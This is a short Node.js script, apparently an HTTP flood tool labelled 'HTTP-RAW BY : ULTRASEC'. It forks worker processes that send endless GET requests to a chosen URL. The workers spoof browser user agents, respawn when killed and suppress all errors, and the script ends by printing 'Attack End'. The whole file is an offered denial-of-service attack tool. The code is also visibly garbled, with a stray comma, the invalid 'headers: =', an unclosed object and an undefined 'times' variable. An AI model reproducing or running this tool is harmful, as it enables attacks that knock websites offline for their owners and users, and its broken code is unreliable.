require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request');
const fakeUa = require('fake-useragent'),
const cluster = require('cluster');

if (process.argv.length <= 3) {
	console.log("HTTP-RAW BY : ULTRASEC");
	console.log("\x1b[0;32mUsage: node raw.js <url> <time> <thread>");
	console.log("\x1b[1;34mExample: node raw <http://example.com> <60> <8>");
	process.exit(0);
}
var target = process.argv[2];
var time = process.argv[3];
var threads = process.argv[4];

function run() {
	var config = {
		method: 'GET',
		url: target,
		headers: = {
			'Cache-Control': 'no-cache',
			'content-type': 'application/json',
			'User-Agent': fakeUa()
		}
		request(config, function (error, response) {
			console.log(response.statusCode);
			}
		)
}

function th() {
	setInterval(() => {
		run()
	})
}

async function main(){
	if (cluster.isMaster) {
		for (let i = 0; i < threads; i++) {
			cluster.fork();
			console.log(`TREADS RUNNING: ${i+1}`);
		}
		cluster.on('exit', function(){
			cluster.fork();
		});
	} else {
		th();
	}
}

main();
setTimeout(() => {
	console.log('Attack End');
	process.exit(0)
},times * 1000);

process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});